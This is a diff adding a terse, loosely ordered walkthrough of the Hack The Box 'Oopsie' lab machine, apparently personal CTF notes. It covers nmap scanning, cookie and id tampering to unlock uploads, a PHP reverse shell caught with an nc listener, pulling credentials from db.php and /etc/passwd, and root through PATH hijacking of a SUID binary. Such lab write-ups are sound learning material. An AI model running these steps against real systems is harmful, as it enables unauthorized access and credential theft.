@@ -1,0 +1,35 @@
+1. apply code nmap -sS -sC -sC -vvv -oN scan_oopsie 10.129.7.159
+2. open port 80 http enter page
+3 We are going to see source code and we'll search login url
+4. trying login with user:admin passwd:admin, root root admin'# root
+we had seen nothing its correct, navigate in option megacorp and we found
+option upload, it says only permission admin right and url
+it has account&id=2 and change 1, and we getting id user admin 34322
+and complete cookie. Voila upload available!
+5. we are going to make reverse_shell.php, It just because server run file php
+6. we're going to copy /usr/share/webshell/php/php_reverse_shell.php in 
+job directory and edit IP and port connection
+7. open nc -nlvp 1234 port listen
+8. upload file reverse shell
+9. apply gobuster dir -u http://10.129.7.159 -w /usr/share/dirb/wordlists/common.txt -x php
+10. verify upload file php_reverse_shell with command:
+10.1gobuster dir -u http://10.129.7.159/uploads -w words.txt -x php
+10.2 file words.txt We're going create with word r_shell_p   
+11.once in console server, apply python3 -c "import pty;pty.spawn('/bin/bash');"
+12. We're going to see user@machine in this case www-data@oopsie
+13. maybe It can't be cool because auto-complete and some commands it's not available
+for that apply crtl+z (stop process) and typing stty raw -echo (auto-complete)
+and some commun command with typing fg so export TERM=xterm
+14.we're going to search user with cat /etc/passwd and let's see robert user available /bin/bash
+15.let's go to default apache directory /var/www/html and we'll search user robert
+16. we're going to found in the file db.php user and password 
+17. login su robert and password
+18.once how robert typing id, we'll see bugtracker
+19. we're going to search file bugtracker with command find / -group bugtracker 2>/dev/null
+to identify all files owned by the bugtracker group
+20. create file cat in directory /tmp and give it chmod +x
+21. typing echo $PATH
+22. modify export PATH=/tmp:$PATH
+23. enter in /usr/bin/bugtracker
+24. typing any number and we're going to see access to root
+25 SUID set owner user id
